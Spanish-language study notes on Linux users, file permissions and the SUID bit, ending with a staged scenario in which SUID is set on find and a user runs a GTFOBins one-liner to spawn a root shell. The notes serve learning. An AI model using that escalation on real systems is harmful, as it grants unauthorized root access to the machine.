# Usuarios
Como bien sabemos los usaurios del sistema se encuentran en `> /etc/passwd` cada uno de estos usuarios tiene una shell, podemos ver las shells registradas en el sistema.

	> /etc/shells

Si deseamos filtrar los usuarios, podemos aplicar un filtro por quien utiliza una *shell* ya que estan siempre terminan en *sh*

	cat /etc/passwd | grep "sh$" | awk '{print $1}' FS=':'

Output:
``` bash
root
postgres
s4tisfacti0n
```

Con `> id` podemos ver lo grupos a los que pertenece el usuario.

## Creacion de usuarios
Creamos el directorio correspondiente del usaurio

	> mkdir /home/white

Creamos el usuario

	> useradd -d /home/white -s /bin/bash white
-d *Directorio correspondiente al usuario*
-s *Tipo de shell a usar*

Obviamente le asignamos como propetario a *white:white*  de su directorio.

	> chown white:white /home/white

Y ya estariael usuario.

	white@DESKTOP-0365ART:~$ pwd
	/home/white
	white@DESKTOP-0365ART:~$ echo $SHELL
	/bin/bash
	white@DESKTOP-0365ART:~$ id
	uid=1001(white) gid=1001(white) grupos=1001(white)
	white@DESKTOP-0365ART:~$ 


# Permisos

## Lectura de permisos 

	drwxr-xr-x   5 s4tisfacti0n s4tisfacti0n  4096 oct 29 17:18 opt
*d* -> Directorio
*rwx rwx rwx*
 P     G    O
 
*r*-> read
*w* -> write/alter/create/delete
*x* -> *f*: execute | *d*: atravezar (cd /opt) 

## Asignacion de permisos & grupos
La asignacion la podemos otorgar con **chmod** que nos sirve para cambiar los permisos.
``` bash
	drwxr-xr-x 2 white white 4096 oct 30 07:31 directorio
	#agregar (+), quitar (-)
	#grupo (g), otros (o)
	chmod o-x directorio/ # no pueden acceder al directorio
	chmod g+rw,o-rx directorio/

```

Asignar a un usuario a un grupo.

	usermod -a -G colegio white

Cambiar el grupo de archivo o directorio con **chgrp**

	chgrp s4tisfacti0n directorio



## Permisos especiales

### SUID
**-rwsr-x---**
La **s** en rws significa setuid, lo que significa establecer ID de usuario. Este es un bit de permiso especial que permite que el programa, cuando lo ejecuta cualquier usuario, se ejecute con el SUID efectivo del propietario

*Nota:*
Este bit de permiso es un riesgo para la seguridad y solo debe aplicarse cuando sea absolutamente necesario.

#### Explotacion y abuso de privilegios

Asignar permiso SUID.
> Conversacion
-white: Oye root nesesito buscar archivos privilegiados con find, dame permiso no?
-root: Vale solo quieres buscar archivos.
-white: Si claro.

Añadiendo un 4 y los permisos del archivo podemos otorgar el permiso UID.

	root> chmod 4755 /usr/bin/find
	#
	root> chmod +s /usr/bin/find

	root> which find | xargs ls -l
	-rwsr-xr-x 1 root root 298576 abr 19  2022 /usr/bin/find

> Conversacion
> -white: Muchas gracias root :)
> -Narrador: Pero white no tiene buenas intencionas asi que busca escalar privilegios.
> 

Asi que va a [GTFobins](https://gtfobins.github.io) y encontro que puede ejecutar una bash con el con *find*

	find . -exec /bin/bash -p \; -quit
Qe consiste en buscar un archivo executable para ejecutar una bash, cuando encuentre este cierra el find.
``` bash
white@DESKTOP-0365ART:~$ find . -exec /bin/bash -p \; -quit
bash-5.2# whoami
root
bash-5.2# 
```

Mas [[Privilegios]].